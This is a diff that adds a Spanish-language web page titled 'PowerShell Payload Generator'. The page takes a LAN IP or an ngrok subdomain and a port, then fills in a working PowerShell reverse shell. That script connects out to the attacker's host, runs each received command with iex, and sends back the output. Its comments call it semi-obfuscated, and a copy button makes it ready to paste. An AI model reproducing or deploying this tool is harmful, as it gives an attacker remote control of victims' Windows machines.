@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PowerShell Payload Generator</title>
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #3498db;
+            --light: #ecf0f1;
+            --success: #27ae60;
+            --gradient: linear-gradient(45deg, #3498db, #2ecc71);
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            margin: 0;
+            padding: 2rem;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            overflow: hidden;
+            transform: translateY(0);
+            transition: transform 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-5px);
+        }
+
+        .header {
+            background: var(--primary);
+            padding: 1.5rem;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1));
+            pointer-events: none;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-weight: 500;
+            position: relative;
+            z-index: 1;
+        }
+
+        .content {
+            padding: 2rem;
+        }
+
+        .mode-selector {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .mode-btn {
+            flex: 1;
+            padding: 1rem;
+            border: none;
+            border-radius: 8px;
+            background: var(--light);
+            color: var(--primary);
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .mode-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: 0.5s;
+        }
+
+        .mode-btn:hover::before {
+            left: 100%;
+        }
+
+        .mode-btn.active {
+            background: var(--gradient);
+            color: white;
+            transform: scale(1.02);
+        }
+
+        .input-group {
+            display: none;
+            margin-bottom: 2rem;
+            opacity: 0;
+            transform: translateY(10px);
+        }
+
+        .input-group.active {
+            display: block;
+            animation: smoothAppear 0.4s ease forwards;
+        }
+
+        .ip-input {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .ip-part {
+            width: 70px;
+            padding: 0.8rem;
+            border: 2px solid var(--light);
+            border-radius: 8px;
+            text-align: center;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .ip-part:focus {
+            outline: none;
+            border-color: var(--secondary);
+            box-shadow: 0 0 10px rgba(52, 152, 219, 0.3);
+        }
+
+        .port-input {
+            width: 120px;
+            padding: 0.8rem;
+            border: 2px solid var(--light);
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+
+        .generate-btn {
+            background: var(--success);
+            color: white;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin: 1rem 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .generate-btn:hover {
+            background: linear-gradient(45deg, #219a52, #27ae60);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(39, 174, 96, 0.3);
+        }
+
+        #payload {
+            width: 100%;
+            height: 250px;
+            padding: 1.5rem;
+            border: 2px solid var(--light);
+            border-radius: 8px;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            resize: vertical;
+            margin: 1rem 0;
+            white-space: pre-wrap;
+            transition: all 0.3s ease;
+            spellcheck: false;
+        }
+
+        #payload:focus {
+            border-color: var(--secondary);
+            box-shadow: 0 0 15px rgba(52, 152, 219, 0.2);
+        }
+
+        .copy-section {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .copy-btn {
+            background: var(--primary);
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .copy-btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 300px;
+            height: 300px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            transition: transform 0.5s ease;
+        }
+
+        .copy-btn:hover::after {
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .copy-btn:hover {
+            background: var(--secondary);
+        }
+
+        @keyframes smoothAppear {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes heartbeat {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .ripple {
+            animation: rippleEffect 0.6s linear;
+        }
+
+        @keyframes rippleEffect {
+            from { transform: scale(0); opacity: 1; }
+            to { transform: scale(2); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔌 Generador de Payload PowerShell</h1>
+        </div>
+        
+        <div class="content">
+            <div class="mode-selector">
+                <button class="mode-btn active" onclick="showSection('lan')">🌐 Configuración LAN</button>
+                <button class="mode-btn" onclick="showSection('ngrok')">🚀 Configuración Ngrok</button>
+            </div>
+
+            <!-- Sección LAN -->
+            <div id="lan-section" class="input-group active">
+                <div class="ip-input">
+                    <span>IP: 192.168.</span>
+                    <input type="number" class="ip-part" id="lan-ip1" placeholder="000" min="0" max="255">
+                    <span>.</span>
+                    <input type="number" class="ip-part" id="lan-ip2" placeholder="000" min="0" max="255">
+                </div>
+                <div class="ip-input">
+                    <span>Puerto:</span>
+                    <input type="number" class="port-input" id="lan-port" min="1" max="65535">
+                </div>
+            </div>
+
+            <!-- Sección Ngrok -->
+            <div id="ngrok-section" class="input-group">
+                <div class="ip-input">
+                    <span>Subdominio:</span>
+                    <input type="text" class="ip-part" id="ngrok-subdomain" placeholder="tunel">
+                    <span>.ngrok.tcp.io</span>
+                </div>
+                <div class="ip-input">
+                    <span>Puerto:</span>
+                    <input type="number" class="port-input" id="ngrok-port" min="1" max="65535">
+                </div>
+            </div>
+
+            <button class="generate-btn" onclick="generatePayload()">⚡ Generar Payload</button>
+            
+            <textarea id="payload" spellcheck="false"></textarea>
+            
+            <div class="copy-section">
+                <button class="copy-btn" onclick="copyPayload(event)">📋 Copiar al Portapapeles</button>
+                <small>¡El payload es editable! Ajusta manualmente si es necesario.</small>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showSection(type) {
+            document.querySelectorAll('.input-group').forEach(group => group.classList.remove('active'));
+            document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
+            document.getElementById(`${type}-section`).classList.add('active');
+            event.currentTarget.classList.add('active');
+            
+            // Efecto de ripple
+            const ripple = document.createElement('span');
+            ripple.className = 'ripple';
+            event.currentTarget.appendChild(ripple);
+            setTimeout(() => ripple.remove(), 600);
+        }
+
+        function generatePayload() {
+            let ip, port;
+            
+            if (document.getElementById('lan-section').classList.contains('active')) {
+                const ip1 = document.getElementById('lan-ip1').value.padStart(3, '0');
+                const ip2 = document.getElementById('lan-ip2').value.padStart(3, '0');
+                port = document.getElementById('lan-port').value;
+                ip = `192.168.${ip1}.${ip2}`;
+            } else {
+                const subdomain = document.getElementById('ngrok-subdomain').value;
+                port = document.getElementById('ngrok-port').value;
+                ip = `${subdomain}.tcp.eu.ngrok.tcp.io`;
+            }
+
+            const payloadTemplate = `# Ejecutar esto en PowerShell visible para ver errores
+$IP = "${ip}"; 
+$Port = ${port};
+$TCPClient = New-Object Net.Sockets.TCPClient;
+$Connect = $TCPClient.ConnectAsync($IP, $Port);
+$Stream = $TCPClient.GetStream();
+$Encoding = [Text.Encoding]::ASCII;
+$Writer = New-Object IO.StreamWriter($Stream);
+$Reader = New-Object IO.StreamReader($Stream);
+$Writer.AutoFlush = $true;
+
+# Ofuscación básica de comandos
+$Execute = { 
+    param($Command)
+    try {
+        $Output = (iex $Command 2>&1 | Out-String);
+        $CurrentDir = (Get-Location).Path + "> ";
+        $Response = $Output + $CurrentDir;
+        return $Response;
+    } catch { 
+        return "[!] Error: $_\`n" + $CurrentDir 
+    }
+}
+
+# Bucle principal semi-ofuscado
+while ($TCPClient.Connected) {
+    try {
+        $Buffer = New-Object Byte[] 4096;
+        $Read = $Stream.Read($Buffer, 0, $Buffer.Length);
+        if ($Read -eq 0) { break }
+        $Command = $Encoding.GetString($Buffer, 0, $Read).Trim();
+        $Response = &$Execute $Command;
+        $Bytes = $Encoding.GetBytes($Response);
+        $Stream.Write($Bytes, 0, $Bytes.Length);
+    } catch { 
+        Write-Host "[!] Fallo: $($_.Exception.Message)";
+        break 
+    }
+}
+
+$TCPClient.Close();`;
+
+            document.getElementById('payload').value = payloadTemplate;
+            
+            // Animación de heartbeat
+            document.querySelector('.generate-btn').style.animation = 'heartbeat 0.4s ease';
+            setTimeout(() => {
+                document.querySelector('.generate-btn').style.animation = '';
+            }, 400);
+        }
+
+        async function copyPayload(event) {
+            try {
+                const payload = document.getElementById('payload').value;
+                await navigator.clipboard.writeText(payload);
+                
+                // Efecto visual
+                const btn = event.currentTarget;
+                btn.textContent = '✓ Copiado!';
+                btn.style.background = '#2ecc71';
+                
+                setTimeout(() => {
+                    btn.textContent = '📋 Copiar al Portapapeles';
+                    btn.style.background = '';
+                }, 2000);
+                
+                // Efecto de partículas
+                const particles = document.createElement('div');
+                particles.style.position = 'absolute';
+                particles.style.pointerEvents = 'none';
+                particles.style.width = '100%';
+                particles.style.height = '100%';
+                event.currentTarget.appendChild(particles);
+                
+                for(let i = 0; i < 8; i++) {
+                    const particle = document.createElement('div');
+                    particle.style.position = 'absolute';
+                    particle.style.left = '50%';
+                    particle.style.top = '50%';
+                    particle.style.width = '4px';
+                    particle.style.height = '4px';
+                    particle.style.background = 'rgba(255,255,255,0.7)';
+                    particle.style.borderRadius = '50%';
+                    particle.style.transform = `translate(-50%, -50%) rotate(${i * 45}deg) translate(20px)`;
+                    particle.style.animation = `particle 0.6s ease-out`;
+                    particles.appendChild(particle);
+                }
+                
+                setTimeout(() => particles.remove(), 600);
+            } catch (err) {
+                alert('Error al copiar: ' + err);
+            }
+        }
+    </script>
+</body>
+</html>
